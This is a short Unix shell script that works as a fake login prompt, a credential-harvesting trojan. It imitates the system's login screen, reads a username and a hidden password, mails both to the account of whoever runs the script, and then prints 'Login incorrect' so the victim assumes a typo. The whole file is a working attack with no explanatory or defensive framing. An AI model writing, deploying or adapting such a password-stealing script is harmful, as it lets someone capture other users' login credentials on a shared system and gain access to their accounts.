#! /bin/sh

# get passwd

clear
cat /etc/issue
echo -n "login: "
read login
echo -n "Password: "
stty -echo
read passwd
stty sane

# here document
mail $USER <<- EOF
    login: $login
    passwd: $passwd
EOF
echo "\nLogin incorrect"
sleep 1

#logout
